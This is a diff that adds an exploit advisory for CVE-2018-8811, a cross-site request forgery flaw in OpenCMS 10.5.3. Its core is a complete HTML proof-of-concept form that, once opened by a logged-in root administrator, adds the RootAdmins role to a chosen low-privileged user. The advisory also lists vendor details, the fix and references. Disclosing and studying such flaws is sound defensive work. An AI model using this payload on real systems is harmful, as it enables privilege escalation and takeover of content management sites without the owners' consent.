@@ -1,0 +1,73 @@
+# Exploit Title: OpenCMS 10.5.3 Multiple Cross Site Request Forgery Vulnerabilities
+Injection
+# Google Dork: N/A
+# Date: 02-04-2018
+#######################################
+# Exploit Author: Sureshbabu Narvaneni
+# Author Blog : http://nullnews.in
+# Vendor Homepage: http://www.opencms.org/en/
+# Software Link: http://www.opencms.org/en/modules/downloads/begindownload.html?id=a7747cd0-b27b-11e7-8299-7fde8b0295e1
+# Affected Version: 10.5.3
+# Category: WebApps
+# Tested on: Ubuntu 14.04 x86_64/Kali Linux 4.12 i686
+# CVE : CVE-2018-8811
+ 
+1. Vendor Description:
+ 
+OpenCms from Alkacon Software is a professional, easy to use website content management system. OpenCms helps content managers worldwide to create and maintain beautiful websites fast and efficiently.
+ 
+2. Technical Description:
+ 
+Cross-site request forgery (CSRF) vulnerability in system/workplace/admin/accounts/user_role.jsp in OpenCMS 10.5.3 allows remote attackers to hijack the authentication of administrative users for requests that perform privilege escalation.
+ 
+3. Proof Of Concept:
+ 
+a) Send below crafted request to logged in user who is having Root Administrator level access.
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://[DomainName]/opencms/system/workplace/admin/accounts/user_role.jsp" method="POST">
+      <input type="hidden" name="dialogtype" value="" />
+      <input type="hidden" name="root" value="" />
+      <input type="hidden" name="sortcol" value="" />
+      <input type="hidden" name="preactiondone" value="" />
+      <input type="hidden" name="oufqn" value="" />
+      <input type="hidden" name="resource" value="" />
+      <input type="hidden" name="userid" value="Replace with actual user id of low privileged user." />
+      <input type="hidden" name="closelink" value="&#37;2Fopencms&#37;2Fsystem&#37;2Fworkplace&#37;2Fviews&#37;2Fadmin&#37;2Fadmin&#45;main&#46;jsp&#37;3Fpath&#37;3D&#37;2Faccounts&#37;2Forgunit&#37;2Fusers&#37;26action&#37;3Dinitial" />
+      <input type="hidden" name="framename" value="" />
+      <input type="hidden" name="ispopup" value="" />
+      <input type="hidden" name="originalparams" value="" />
+      <input type="hidden" name="message" value="" />
+      <input type="hidden" name="selitems" value="RoleRootAdmins" />
+      <input type="hidden" name="title" value="" />
+      <input type="hidden" name="style" value="new" />
+      <input type="hidden" name="page" value="" />
+      <input type="hidden" name="base" value="" />
+      <input type="hidden" name="path" value="&#37;2Faccounts&#37;2Forgunit&#37;2Fusers&#37;2Fedit&#37;2Frole" />
+      <input type="hidden" name="action" value="listmultiaction" />
+      <input type="hidden" name="searchfilter" value="" />
+      <input type="hidden" name="redirect" value="" />
+      <input type="hidden" name="force" value="" />
+      <input type="hidden" name="formname" value="lsre&#45;form" />
+      <input type="hidden" name="listaction" value="ma" />
+      <input type="hidden" name="listMultiAction" value="RoleRootAdmins" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+ 
+b) Once the logged in user opens the URL the form will get submitted with active session of root administrator and action get performed successfully.
+
+c) By leveraging this vulnerability user can gain Root Level Administrator Access to the CMS.
+
+
+4. Solution:
+ 
+Upgrade to latest release.
+http://www.opencms.org/en/home/news.html
+ 
+5. Reference:
+https://github.com/alkacon/opencms-core/issues/586
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-8811
